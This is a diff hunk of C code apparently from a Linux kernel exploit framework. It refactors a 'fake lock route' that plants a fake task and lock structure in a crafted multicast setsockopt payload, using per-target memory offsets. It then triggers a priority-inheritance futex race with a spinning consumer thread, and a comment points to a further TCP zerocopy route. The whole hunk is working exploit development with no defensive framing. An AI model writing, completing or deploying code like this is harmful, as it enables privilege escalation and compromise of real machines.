@@ -215,46 +215,62 @@ void kernel5_resident_stop(void) {
 }
 
 RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
-  MulticastWaiterRouteContext context;
-  int stamp_result = -1;
-  multicast_waiter_route_context_init(
-      &context, &g_pi_race_context, request, execution_settings(),
-      target_profile_multicast_waiter_layout(&g_target_profile), 0);
-  context.main_cpu = g_runtime_config.main_cpu;
-  context.consumer_cpu = g_runtime_config.consumer_cpu;
-  context.task=fake_task; context.lock=fake_lock;
-  context.socket_fd=socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
-  if (context.socket_fd<0) {
-    route_last_step=60; route_last_errno=errno;
-    context.status.step=route_last_step;
-    context.status.error_number=route_last_errno;
-    goto out;
+  (void)request;
+  RouteStatus status = {.code = ROUTE_RETRYABLE};
+  MulticastWaiterLayout layout =
+      target_profile_multicast_waiter_layout(&g_target_profile);
+  size_t stamp_size = layout.buffer_size;
+  unsigned char stamp[stamp_size];
+  memset(stamp, 0, sizeof(stamp));
+  build_multicast_waiter_payload(
+      stamp, layout.waiter_offset, layout.task_offset,
+      layout.lock_offset, fake_task, fake_lock);
+  uint16_t family = AF_UNSPEC;
+  memcpy(stamp + 8, &family, sizeof(family));
+
+  int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+  if (fd < 0) {
+    route_last_step = 60;
+    route_last_errno = errno;
+    status.step = route_last_step;
+    status.error_number = route_last_errno;
+    status.userspace_clean = 1;
+    status.kernel_disarmed = 1;
+    status.code = ROUTE_FALLBACK_SAFE;
+    return status;
   }
-  atomic_store(&context.race->consumer_calls,0);
-  atomic_store(&context.race->consumer_success,0);
-  atomic_store(&context.race->consumer_stop,0);
-  atomic_store(&context.race->route_delay_usec,0);
+  atomic_store(&g_pi_race_context.consumer_calls, 0);
+  atomic_store(&g_pi_race_context.consumer_success, 0);
+  atomic_store(&g_pi_race_context.consumer_stop, 0);
+  atomic_store(&g_pi_race_context.route_delay_usec, 0);
   errno = 0;
-  stamp_result=multicast_waiter_stamp(&context,0,0,context.lock);
+  int stamp_result =
+      setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, sizeof(stamp));
   route_last_step = 61; route_last_errno = errno;
-  atomic_store(&context.race->consumer_go,1);
-  for (int spin=0; spin<100000000 &&
-       atomic_load(&context.race->consumer_calls)==0; spin++)
+  atomic_store(&g_pi_race_context.consumer_go, 1);
+  for (int spin = 0; spin < 100000000 &&
+       atomic_load(&g_pi_race_context.consumer_calls) == 0; spin++)
     __asm__ volatile("yield" ::: "memory");
-out:
-  /* consumer_calls is incremented before sched_setattr/futex completes.
-   * Drain first so consumer_success is a stable completion result. */
-  multicast_waiter_disarm(&context);
-  if (stamp_result==0 || atomic_load(&context.race->consumer_success)>0) {
-    route_last_step=0; route_last_errno=0; context.status.code=ROUTE_OK;
+  atomic_store(&g_pi_race_context.consumer_go, 0);
+  while (atomic_load(&g_pi_race_context.consumer_inflight))
+    __asm__ volatile("yield" ::: "memory");
+  close(fd);
+  status.userspace_clean = 1;
+  status.kernel_disarmed = 1;
+  if (stamp_result == 0 ||
+      atomic_load(&g_pi_race_context.consumer_success) > 0) {
+    route_last_step = 0;
+    route_last_errno = 0;
+    status.code = ROUTE_OK;
+  } else {
+    status.code = ROUTE_FALLBACK_SAFE;
   }
-  context.status.step=route_last_step;
-  context.status.error_number=route_last_errno;
-  multicast_waiter_destroy(&context);
+  status.step = route_last_step;
+  status.error_number = route_last_errno;
   pr_info("multicast route status=%d clean=%d/%d step=%d errno=%d\n",
-          context.status.code,context.status.userspace_clean,
-          context.status.kernel_disarmed,route_last_step,route_last_errno);
-  return context.status;
+          status.code, status.userspace_clean, status.kernel_disarmed,
+          route_last_step, route_last_errno);
+  return status;
 }
 
 /* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
